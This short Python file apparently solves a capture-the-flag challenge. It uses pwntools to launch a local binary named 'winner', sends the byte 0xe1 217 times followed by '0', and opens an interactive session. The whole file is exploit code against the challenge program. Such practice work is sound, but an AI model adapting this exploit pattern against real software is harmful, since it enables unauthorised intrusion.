#!/usr/bin/python

from pwn import *

r = process("./winner")
r.recvuntil("done)\n")
for i in range(217):
	r.send("\xe1")
#pause()
r.send("0")
r.interactive()
